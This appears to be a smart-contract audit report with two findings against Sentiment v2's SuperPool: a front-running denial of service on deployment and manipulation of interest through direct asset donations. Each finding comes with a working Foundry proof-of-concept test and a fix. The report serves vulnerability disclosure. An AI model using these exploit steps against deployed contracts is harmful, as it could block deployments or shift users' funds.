### M[01] Attacker Can Cause DoS in SuperPool Deployment

#### Summary

An attacker can exploit the predictable address of a newly deployed `SuperPool` contract to deposit assets **before** the contract is officially deployed. This front-running leads to the initial deposit by the contract owner minting fewer than the required 1000 shares, causing a denial of service (DoS) on the contract deployment process.

-----

#### Vulnerability Detail

When a new `SuperPool` is deployed, its address can be predicted using the contract's nonce and the deployer's address. An attacker can take advantage of this by sending assets to the precomputed address before the `SuperPool` contract is deployed. The factory contract relies on the initial deposit to mint a minimum of 1000 shares, which are then burned. However, if the attacker has already sent assets to the precomputed address, the initial deposit by the contract owner will mint fewer than 1000 shares, causing the deployment process to revert.

-----

#### Impact

This vulnerability allows an attacker to effectively **block the deployment of new `SuperPool` contracts** by causing the `SuperPoolFactory_TooFewInitialShares` error to be triggered. The deployer would need to deposit 1000 times the amount of assets already present in the contract to meet the minimum share requirement, making it infeasible to deploy the contract.

-----

#### Code Snippet

```solidity
// Create the new SuperPool
SuperPool superPool = new SuperPool(POOL, asset, feeRecipient, fee, superPoolCap, name, symbol);
superPool.transferOwnership(owner);
isDeployerFor[address(superPool)] = true;

// Burn initial deposit
IERC20(asset).safeTransferFrom(msg.sender, address(this), initialDepositAmt); // assume approval
IERC20(asset).approve(address(superPool), initialDepositAmt);
uint256 shares = superPool.deposit(initialDepositAmt, address(this));

// Revert if the minimum number of shares is not met
if (shares < MIN_BURNED_SHARES) revert SuperPoolFactory_TooFewInitialShares(shares);

// Burn the shares
IERC20(superPool).transfer(DEAD_ADDRESS, shares);
```

**Link:** [SuperPoolFactory.sol\#L75](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPoolFactory.sol#L75)

-----

#### Coded PoC

The following proof of concept (PoC) demonstrates the attack:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../BaseTest.t.sol";
import {console2} from "forge-std/console2.sol";
import {FixedPriceOracle} from "src/oracle/FixedPriceOracle.sol";

contract SuperPoolUnitTests is BaseTest {
    uint256 initialDepositAmt = 1e5;

    Pool pool;
    Registry registry;
    SuperPool superPool;
    RiskEngine riskEngine;
    SuperPoolFactory superPoolFactory;

    address public feeTo = makeAddr("FeeTo");

    function setUp() public override {
        super.setUp();

        pool = protocol.pool();
        registry = protocol.registry();
        riskEngine = protocol.riskEngine();
        superPoolFactory = protocol.superPoolFactory();

        FixedPriceOracle asset1Oracle = new FixedPriceOracle(1e18);
        vm.prank(protocolOwner);
        riskEngine.setOracle(address(asset1), address(asset1Oracle));
    }

    function testDeployAPoolFromFactory_WITH_BUG() public {
        address feeRecipient = makeAddr("FeeRecipient");

        vm.prank(protocolOwner);
        asset1.mint(address(this), initialDepositAmt);
        asset1.approve(address(superPoolFactory), initialDepositAmt);

        // Attacker front-runs by sending assets to the pre-calculated address
        address preDeployedSuperPoolAddress = 0x48B7bEE37E99c87E81DC7896011b83c438Ef0f31;
        asset1.mint(preDeployedSuperPoolAddress, 1e18);

        // Deployment now reverts because the initial deposit mints too few shares
        vm.expectRevert();
        address deployed = superPoolFactory.deploySuperPool(
            poolOwner,
            address(asset1),
            feeRecipient,
            1e17,
            type(uint256).max,
            initialDepositAmt,
            "test",
            "test"
        );
        console2.log("deployed", deployed);
    }
}
```

-----

#### Tool Used

Manual Review

-----

#### Recommendation

To mitigate this issue, **transfer the asset balance in the constructor** of the `SuperPool` contract.

-----

### M[02] Attacker Can Manipulate Interest Distribution by Exploiting Asset Transfers and Fee Accrual Mechanism

#### Summary

An attacker can take advantage of the `SuperPool`'s interest system. By depositing a large amount of assets directly to the contract **before a regular user deposits**, the attacker can cause the "dead" address (`0x...dEaD`) to receive a disproportionately large amount of interest. This unfairly benefits the dead address at the expense of other users. The issue is caused by how the system calculates and allocates fees and interest.

-----

#### Vulnerability Detail

The vulnerability arises from the fact that an attacker can send a significant amount of assets to the `SuperPool` before a deposit is made by a regular user. This results in a disproportionate amount of interest being allocated to shares owned by the dead address, which received shares during the initialization of the `SuperPool`. The specific sequence of operations allows the dead address to accumulate a substantial amount of interest due to the way fee shares are calculated and allocated.

-----

#### Impact

The primary impact is that the dead address can accumulate a large portion of the total interest accrued by the `SuperPool`, resulting in:

  * **Unequal distribution** of accrued interest among stakeholders.
  * **Potential financial loss** for legitimate users, as their share of the interest is reduced in favor of the dead address.

-----

#### Code Snippet

```solidity
function simulateAccrue() internal view returns (uint256, uint256) {
    uint256 newTotalAssets = totalAssets();
    uint256 interestAccrued = (newTotalAssets > lastTotalAssets) ? newTotalAssets - lastTotalAssets : 0;
    if (interestAccrued == 0 || fee == 0) return (0, newTotalAssets);

    uint256 feeAssets = interestAccrued.mulDiv(fee, WAD);
    // newTotalAssets already includes feeAssets
    uint256 feeShares = _convertToShares(feeAssets, newTotalAssets - feeAssets, totalSupply(), Math.Rounding.Down);

    return (feeShares, newTotalAssets);
}
```

**Link:** [SuperPool.sol\#L366](https://www.google.com/search?q=https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPool.sol%23L366)

-----

#### Coded PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../BaseTest.t.sol";
import {console2} from "forge-std/console2.sol";
import {FixedPriceOracle} from "src/oracle/FixedPriceOracle.sol";

contract SuperPoolUnitTests is BaseTest {
    uint256 initialDepositAmt = 1000;

    Pool pool;
    Registry registry;
    SuperPool superPool;
    RiskEngine riskEngine;
    SuperPoolFactory superPoolFactory;
    address user_1 = makeAddr("User_1");
    address attacker = makeAddr("Attacker");
    address public feeTo = makeAddr("FeeTo");

    function setUp() public override {
        super.setUp();

        pool = protocol.pool();
        registry = protocol.registry();
        riskEngine = protocol.riskEngine();
        superPoolFactory = protocol.superPoolFactory();

        FixedPriceOracle asset1Oracle = new FixedPriceOracle(1e18);
        vm.prank(protocolOwner);
        riskEngine.setOracle(address(asset1), address(asset1Oracle));
    }

    function test_interest_manipulation_WITH_BUG() public {
        address feeRecipient = makeAddr("FeeRecipient");

        vm.prank(protocolOwner);
        asset1.mint(address(this), initialDepositAmt);
        asset1.approve(address(superPoolFactory), initialDepositAmt);

        address deployed = superPoolFactory.deploySuperPool(
            poolOwner, address(asset1), feeRecipient, 1e17, type(uint256).max,
            initialDepositAmt, "test", "test"
        );
        superPool = SuperPool(deployed);

        /*//////////////////////////////////////////////////////////////
        //        ATTACKER SENDS FUNDS DIRECTLY TO SUPERPOOL          //
        //////////////////////////////////////////////////////////////*/
        vm.startPrank(attacker);
        asset1.mint(attacker, 1e18);
        asset1.transfer(address(superPool), 1e18);
        vm.stopPrank();

        /*//////////////////////////////////////////////////////////////
        //          USER_1 DEPOSITS INTO SUPERPOOL                    //
        //////////////////////////////////////////////////////////////*/
        vm.startPrank(user_1);
        asset1.mint(user_1, 1e18);
        asset1.approve(address(superPool), type(uint256).max);
        superPool.deposit(1e18, user_1);
        vm.stopPrank();

        console2.log("SuperPool(SHARES) Balance of User1: ", superPool.balanceOf(user_1));
        console2.log("SuperPool(SHARES) Balance of FeeRecipient: ", superPool.balanceOf(feeRecipient));
        
        /*//////////////////////////////////////////////////////////////
        //             NOW SUPERPOOL ACCUMULATES INTEREST             //
        //////////////////////////////////////////////////////////////*/
        asset1.mint(address(superPool), 0.5e18);
        superPool.accrue();
        uint SHARES_OF_DEAD_ADDRESS = superPool.balanceOf(0x000000000000000000000000000000000000dEaD);

        console2.log("SuperPool(SHARES) Balance of FeeRecipient (after accrue): ", superPool.balanceOf(feeRecipient));
        console2.log("asset1 balance of superpool: ", asset1.balanceOf(address(superPool)));
        console2.log("SuperPool(SHARES) Total Supply: ", superPool.totalSupply());

        // Assert that the value of the dead address's shares is > 40% of the total assets
        assert(
            superPool.previewMint(SHARES_OF_DEAD_ADDRESS) > (asset1.balanceOf(address(superPool)) * 4) / 10
        );
    }
}
```

-----

#### Tool Used

Manual Review

-----

#### Recommendation

**Limit the value of the Dead Address's shares** during the interest calculation to prevent them from absorbing a disproportionate amount of accrued interest.